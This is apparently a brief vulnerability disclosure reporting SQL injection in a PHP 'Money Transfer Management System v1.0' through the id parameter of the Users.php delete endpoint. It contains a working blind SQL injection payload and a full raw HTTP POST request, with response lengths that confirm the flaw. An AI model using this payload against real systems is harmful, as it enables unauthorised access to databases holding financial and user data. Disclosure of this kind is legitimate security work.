# Money Transfer Management System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15015/money-transfer-management-system-send-money-businesses-php-free-source-code.html

Vulnerability File: /mtms/classes/Users.php?f=delete

Vulnerability location: /mtms/classes/Users.php?f=delete,id

[+] Payload: id=2' and length(database()) =7 --+  // Leak place ---> id

Current database name: mtms_db,length is 7

```sql
POST /mtms/classes/Users.php?f=delete HTTP/1.1
Host: 192.168.1.19
Content-Length: 35
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/mtms/admin/?page=user/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bnvs2lhahed1884v0nf12nt52s
Connection: close

id=2' and length(database()) =7 --+ // Leak place ---> id
```

When length (database ()) = 7, Content-Length: 19
![image](https://user-images.githubusercontent.com/54017627/164725661-f6d7858f-a5be-47c1-a3f9-27e5a1b3dde2.png)


When length (database ()) = 8, Content-Length: 169
![image](https://user-images.githubusercontent.com/54017627/164725736-ce4aac83-38ca-4759-819a-39a410b5cbed.png)
